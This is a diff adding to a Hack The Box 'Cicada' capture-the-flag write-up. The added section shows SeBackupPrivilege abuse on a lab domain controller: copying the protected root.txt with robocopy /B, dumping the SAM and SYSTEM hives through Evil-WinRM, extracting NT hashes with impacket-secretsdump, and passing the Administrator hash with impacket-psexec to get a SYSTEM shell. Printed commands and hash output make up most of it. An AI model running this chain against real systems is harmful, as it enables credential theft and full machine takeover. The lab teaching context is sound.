@@ -70,8 +70,71 @@ cat .\Contract.txt
 # File content is now readable
 ```
 
+## OR  copy using robocopy
+```
+robocopy "C:\Users\Administrator\Desktop" "C:\Temp" "root.txt" /B
+```
+# Window Registery (Administrator hash)
+SeBackupPrivilege is an instant win. We can copy the sam and system registry values and pass the Administrator hash.
+```bash
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system C:\temp\system.hive 
+The operation completed successfully.
 
-## 🚨 Attacking a Domain Controller with SeBackupPrivilege
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam C:\temp\sam.hive
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd C:\temp
+*Evil-WinRM* PS C:\temp> download sam.hive
+                                        
+Info: Downloading C:\temp\sam.hive to sam.hive
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\temp> download system.hive
+                                        
+Info: Downloading C:\temp\system.hive to system.hive
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\temp>
+```
+Now back at the attacker, I can use `impacket-secretsdump` to well, dump the secrets.
+```
+┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
+└─$ impacket-secretsdump -sam sam.hive -system system.hive local
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up...
+```
+
+Thanks to windows and it's silliness, I can just pass the administrator hash using impacket-psexec and have a shell as system.
+
+```
+┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
+└─$ impacket-psexec cicada.htb/Administrator@10.129.198.41 -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.198.41.....
+[*] Found writable share ADMIN$
+[*] Uploading file DgNSqBjx.exe
+[*] Opening SVCManager on 10.129.198.41.....
+[*] Creating service RURf on 10.129.198.41.....
+[*] Starting service RURf.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.2700]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+
+
+
+___
+# Attacking a Domain Controller with SeBackupPrivilege
 
 
 ### Why Target the Domain Controller?
